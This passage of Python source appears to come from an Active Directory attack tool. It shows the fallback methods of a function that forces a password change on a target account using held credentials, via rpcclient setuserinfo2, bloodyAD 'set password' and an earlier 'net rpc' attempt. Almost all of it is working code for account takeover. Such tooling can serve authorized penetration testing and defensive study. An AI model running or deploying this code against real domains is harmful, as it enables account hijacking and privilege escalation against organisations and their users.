        except FileNotFoundError:
            self._log(f"    [*] net command not found")
        except Exception as e:
            self._log(f"    [*] net rpc error: {e}")
        
        # Method 3: Try rpcclient setuserinfo2
        self._log(f"    [*] Trying rpcclient method...")
        try:
            # rpcclient command to change password
            rpcclient_cmd = f'setuserinfo2 {target} 23 "{new_password}"'
            
            cmd = [
                'rpcclient', '-U', 
                f'{self.current_username}%{self.current_password}',
                self.server_ip, '-c', rpcclient_cmd
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # rpcclient returns 0 even on some errors, check output
            if result.returncode == 0 and 'NT_STATUS' not in result.stdout and 'NT_STATUS' not in result.stderr:
                action.success = True
                action.details = f"Password changed via rpcclient setuserinfo2"
                return action
            else:
                error_msg = result.stderr.strip() or result.stdout.strip()
                self._log(f"    [*] rpcclient failed: {error_msg}")
        except FileNotFoundError:
            self._log(f"    [*] rpcclient not found")
        except Exception as e:
            self._log(f"    [*] rpcclient error: {e}")
        
        # Method 4: Try bloodyAD if available
        self._log(f"    [*] Trying bloodyAD method...")
        try:
            cmd = [
                'bloodyAD', '-d', self.domain,
                '-u', self.current_username, '-p', self.current_password,
                '--host', self.server_ip,
                'set', 'password', target, new_password
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0 or 'successfully' in result.stdout.lower():
                action.success = True
                action.details = f"Password changed via bloodyAD"
                return action
            else:
                self._log(f"    [*] bloodyAD failed: {result.stderr.strip()}")
        except FileNotFoundError:
            self._log(f"    [*] bloodyAD not found")
        except Exception as e:
            self._log(f"    [*] bloodyAD error: {e}")
        
        # All methods failed
        action.error = "All password change methods failed"
        return action

